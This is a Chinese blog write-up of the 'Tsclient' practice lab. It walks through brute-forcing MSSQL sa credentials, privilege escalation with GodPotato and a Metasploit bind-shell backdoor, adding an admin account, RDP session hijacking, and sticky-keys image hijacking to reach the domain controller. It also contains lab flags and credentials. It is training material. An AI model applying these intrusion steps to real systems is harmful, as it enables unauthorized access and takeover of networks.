---
layout: post
title: 春秋云境——Tsclient
---

# 0x01 信息收集

---

最开始的信息收集，我们先上fscan和Tscanplus，扫一下主机IP。

```cmd
┌──────────────────────────────────────────────┐
│    ___                              _        │
│   / _ \     ___  ___ _ __ __ _  ___| | __    │
│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
└──────────────────────────────────────────────┘
      Fscan Version: 2.0.0

[2025-03-27 21:20:24] [INFO] 暴力破解线程数: 1
[2025-03-27 21:20:24] [INFO] 开始信息扫描
[2025-03-27 21:20:24] [INFO] 最终有效主机数量: 1
[2025-03-27 21:20:24] [INFO] 开始主机扫描
[2025-03-27 21:20:24] [INFO] 有效端口数量: 233
[2025-03-27 21:20:24] [SUCCESS] 端口开放 39.99.148.208:110
[2025-03-27 21:20:24] [SUCCESS] 端口开放 39.99.148.208:80
[2025-03-27 21:20:24] [SUCCESS] 端口开放 39.99.148.208:1433
[2025-03-27 21:20:24] [SUCCESS] 端口开放 39.99.148.208:139
[2025-03-27 21:20:26] [SUCCESS] 服务识别 39.99.148.208:110 =>
[2025-03-27 21:20:29] [SUCCESS] 服务识别 39.99.148.208:1433 => [ms-sql-s] 版本:13.00.1601 产品:Microsoft SQL Server 2016 系统:Windows Banner:[.%.A.]
[2025-03-27 21:20:29] [SUCCESS] 服务识别 39.99.148.208:139 =>  Banner:[.]
[2025-03-27 21:20:29] [SUCCESS] 服务识别 39.99.148.208:80 => [http]
[2025-03-27 21:20:34] [INFO] 存活端口数量: 4
[2025-03-27 21:20:34] [INFO] 开始漏洞扫描
[2025-03-27 21:20:34] [INFO] 加载的插件: mssql, netbios, pop3, webpoc, webtitle
[2025-03-27 21:20:34] [SUCCESS] 网站标题 http://39.99.148.208      状态码:200 长度:703    标题:IIS Windows Server
[2025-03-27 21:20:41] [SUCCESS] MSSQL 39.99.148.208:1433 sa 1qaz!QAZ
```

扫描到了mssql的服务，而且还将账密爆破出来了。是个不错的入口点。

---

# 0x02 mssql服务提权

---

既然可以直接连接mssql，我们直接上Multiple.Database.Utilization.Tools来梭哈一下。注意工具启动的java版本必须是java8，进入后需要先初始化，再正常新建连接即可。

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Tsclient/001.png?raw=true)

进入后查看权限为mssqlserver权限，蛮低的其实。所以我们需要在MDUT里面提一下权。提权漏洞选用Godpotato，为保证提权后会话的持久化、且保证Godpotato运行尽可能少的次数(跑多次会直接宕机)，建议直接拿godpotato跑msf的后门。

```cmd
use exploit/multi/handler
set payload windows/meterpreter/bind_tcp
```

笔者个人比较喜欢用正向后门，毕竟不是什么时候都能有个可以反弹的公网ip。

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Tsclient/002.png?raw=true)

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Tsclient/003.png?raw=true)

拿到system权限后，我们先添加本地的管理员账户，再RDP登上去看一下。拿到了flag01

```cmd
 _________  ________  ________  ___       ___  _______   ________   _________   
|\___   ___\\   ____\|\   ____\|\  \     |\  \|\  ___ \ |\   ___  \|\___   ___\ 
\|___ \  \_\ \  \___|\ \  \___|\ \  \    \ \  \ \   __/|\ \  \\ \  \|___ \  \_| 
     \ \  \ \ \_____  \ \  \    \ \  \    \ \  \ \  \_|/_\ \  \\ \  \   \ \  \  
      \ \  \ \|____|\  \ \  \____\ \  \____\ \  \ \  \_|\ \ \  \\ \  \   \ \  \ 
       \ \__\  ____\_\  \ \_______\ \_______\ \__\ \_______\ \__\\ \__\   \ \__\
        \|__| |\_________\|_______|\|_______|\|__|\|_______|\|__| \|__|    \|__|
              \|_________|                                                      


Getting flag01 is easy, right?

flag01: flag{9ef0a66b-42a7-4c06-b355-d6d9aaedf5e6}


Maybe you should focus on user sessions...
```

---

# 0x03 内网探测

---

提醒我们需要去查看一下session会话，windows上的session会话除了RDP貌似也没有其他的了。索性查看一下这台主机上有没有正在进行的会话。看看能不能打一下RDP会话劫持。`quser`还真查看到了进程中的RDP会话。

- [文章 - 内网技巧-RDP劫持及利用hash登录 - 先知社区](https://xz.aliyun.com/news/8167?time__1311=YqUxgiD%3DY7q05DK5YKP7KYDv%2B1QGTW4D&u_atoken=cbf0ccc345fcda6117af4487d9e78123&u_asig=1a0c384917430827336436331e003f)

```cmd
C:\Windows\system32>quser
 用户名                会话名             ID  状态    空闲时间   登录时间
 john                  rdp-tcp#0           2  运行中         18  2025/3/27 21:21
>gailo                 rdp-tcp#4           3  运行中          .  2025/3/27 21:36
C:\Windows\system32>
```

按教程逐步操作即可。笔者选用psexec提权至system的方法。感觉纯windows还是得上Cobalt Strike，打一半去换了个C2回来接着打。Cobalt Strike操作不再介绍，进程注入直接就能切换用户。

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Tsclient/004.png?raw=true)

```cmd
xiaorang.lab\Aldrich:Ald@rLMWuy7Z!#

Do you know how to hijack Image?
```

给了账密，提醒我们要打映像劫持。保险起见我们使用kali内的rdesktop进行远程连接。因为windows自带的mstsc在密码过期时会拒绝连接。

```cmd
172.22.8.15:88 open
172.22.8.46:445 open
172.22.8.18:1433 open
172.22.8.31:445 open
172.22.8.15:445 open
172.22.8.18:445 open
172.22.8.46:139 open
172.22.8.18:135 open
172.22.8.15:139 open
172.22.8.31:135 open
172.22.8.46:135 open
172.22.8.18:139 open
172.22.8.15:135 open
172.22.8.46:80 open
172.22.8.31:139 open
172.22.8.18:80 open
[+] NetInfo:
[*]172.22.8.31
   [->]WIN19-CLIENT
   [->]172.22.8.31
[+] NetInfo:
[*]172.22.8.46
   [->]WIN2016
   [->]172.22.8.46
[+] NetInfo:
[*]172.22.8.18
   [->]WIN-WEB
   [->]172.22.8.18
   [->]2001:0:348b:fb58:4cc:2cf6:d89c:6c90
[+] NetInfo:
[*]172.22.8.15
   [->]DC01
   [->]172.22.8.15
[*] 172.22.8.31          XIAORANG\WIN19-CLIENT      
[*] 172.22.8.15    [+]DC XIAORANG\DC01              
[*] 172.22.8.46          XIAORANG\WIN2016           Windows Server 2016 Datacenter 14393
[*] WebTitle:http://172.22.8.46        code:200 len:703    title:IIS Windows Server
[*] WebTitle:http://172.22.8.18        code:200 len:703    title:IIS Windows Server
[+] mssql:172.22.8.18:1433:sa 1qaz!QAZ
```

我们肯定是先去试试31和46两个主机。尝试后发现31主机可以登录。后面就是映像劫持的粘滞键提权+SC计划任务直接跑后门拿下域控即可。这台靶机质量实在不敢恭维，后面就不做复现了。

---



